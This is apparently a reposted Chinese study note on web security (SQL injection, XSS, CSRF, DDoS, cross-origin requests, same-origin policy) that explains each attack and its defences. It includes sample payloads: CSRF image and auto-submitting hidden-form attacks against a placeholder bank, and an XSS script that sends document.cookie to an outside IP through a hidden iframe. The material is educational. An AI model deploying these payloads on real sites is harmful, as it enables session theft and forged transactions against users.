# SQL注入 xss csrf ddos 跨域的问题

*****

> 深刻理解同源策略；
>
> 同源策略：

###sql 注入： 

<font color=red>产生的原因：就是数据和程序是不分开的，数据和程序一起去编译； 所以用户输入sql程序的时候也会被编译，那么用户是不是就可以去间接的操数据库；这是产生sql注入的原因；</font>



解决方案：PDO的的预处理 先对sql程序做编译，然后再做数据的绑定，然后去执行；



不仅提高了安全性，还有那个减少了预编译的过程，提高了效率；

`````php
$sdn = 'mysql:host=mysql;dbname=demo;';
$pdo = new PDO($sdn,$user,$passwd,$options);

$res = $pdo->prepare();
$res->bindParams();
$res->execute();
`````



###**xss： 过滤 一些js代码就可以了 htmlspecialchars**   **xss：跨站脚本攻击；**

XSS 全称 “跨站脚本”，是注入攻击的一种，用户输入总是不可信任的，这点对于 Web 开发者应该是常识。

所以这里要做转义；php中就是htmlspecialchars();  做转义；

```php
 //1.就是把 < > 转译成 &lt; &gt;
//2.htmlspecialchars()
// 
```

******



###**csrf ：cross-site request forgery  跨站请求伪造；**



产生的条件：

1. **去登录受信任的网站**
2. **没有退出 去访问有漏洞的网站；**   **还要知道受信任的网站的漏洞；**

<font color=red>产生的原因：主要是存在隐式的身份验证，不能保证所有的请求都是用户自己准许的请求；会带上cookie来进行访问；不是劫持cookie，是冒用用户的cookie；</font>



`````shell
##我们项目中重写了tokensMatch方法，然后调父类的handle的时候，父类中使用的是this调用tokensMatch的，个人感觉应该最后有用的是我们重写的这个方法，如果是ajax请求的话，我们就检测request−>header(′X−CSRF−TOKEN′)与session中的token是否一样否则的话，就检测request->input('_token')与session中的token是否一样。
`````

解决方案：

不要用get 去修改数据，php代码的话不要用$_REUEST 去接收数据；get 太容易被csrf攻击；一张图片，就可以，触发csrf攻击；触发条件太简单；

如果是post请求;

token  生成随机字符串的形式；区分开用户请求和黑客的请求；

referer 当前请求的来源地址；

验证码：太低级用户体验不好，所以一一般会使用token，令牌；

get的ccsrf；

　　<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>

post的csrf



``````html
<html>
　　<head>
<script type="text/javascript">
　　　　　　function steal()
　　　　　　{
          　　　　 iframe = document.frames["steal"];
　　     　　      iframe.document.Submit("transfer");
　　　　　　}
　　　　</script>
　　</head>

　　<body onload="steal()">
　　　　<iframe name="steal" display="none">
　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
　　　　　　　　<input type="hidden" name="toBankId" value="11">
　　　　　　　　<input type="hidden" name="money" value="1000">
　　　　　　</form>
　　　　</iframe>
　　</body>
</html>
//一个隐藏的input框， 

``````







###**d  dos**

>在短时间内发起大量的请求，耗尽服务器的资源，无法响应正常的访问，造成网站的下线；
>
>缩写：distributed  de'nia'l of service 分布式停止服务 ，分布式代表请求来自四处八方；

阻挡流量；限制流量；

ddos 升级防火墙，nginx还有程序员做的一些nginx 做的一些 limit_req limit_con 限制访问：限制访问和限制TCP连接，自身的防火墙，硬件防火墙去购买；

扩容

扩充服务器	



cdn分流的思想

cdn（利用了静态缓存，进行分流，不需要访问我们的服务器；） 



###**跨域问题：**

jsonp：原理 运用，利用 script 标签带有herf  img  src属性可以跨域访问；兼容性比较好，能解决大部分浏览器的跨域数据访问的问题，局限性 就是只能用于get；	

只有ajax 才会存在跨域的问题；  XMLhttprequest  XHR  fetch   请求都会存在跨域的问题；  AJAX 页面无刷新更新数据；动态更新；

cors ： header("Access-Control-Allow-Origin:*");      **Cross-Origin Resource Sharing**

代理：proxy_pass www.baidu.com  因为 服务器 不会存在跨域的问题；

**WebSocket 是一种通信协议，使用`ws://`（非加密）和`wss://`（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。**

利用header 中的origin，请求源，发在那个域名；协议+域名+端口三部分组成；来判断是否是跨域；



###  同源策略产生的原因

https://en.wikipedia.org/wiki/Same-origin_policy  同源策略；

同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。

 `````js
 (function(window, document) {
     // 构造泄露信息用的 URL
     var cookies = document.cookie;
     var xssURIBase = "http://192.168.123.123/myxss/";
     var xssURI = xssURIBase + window.encodeURI(cookies);
     // 建立隐藏 iframe 用于通讯
     var hideFrame = document.createElement("iframe");
     hideFrame.height = 0;
     hideFrame.width = 0;
     hideFrame.style.display = "none";
     hideFrame.src = xssURI;
     // 开工
     document.body.appendChild(hideFrame);
 })(window, document);
 `````



我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，**只能访问当前域名下的 URL，所谓不能 “跨域” 问题。这种做法的初衷也是防范 XSS**，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止 XSS 的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。



在随着互联网的发展，同源策略越来越严格，就目前而言，如果非同源，共有三种行为受到限制。

> （1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。
>  （2） 无法接触非同源网页的 DOM。
>  （3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。



作者：不言殇
链接：https://www.jianshu.com/p/d1a8956d1b60
来源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

————————————————
原文作者：lizhiqiang666
转自链接：https://learnku.com/articles/20710
版权声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请保留以上作者信息和原文链接。
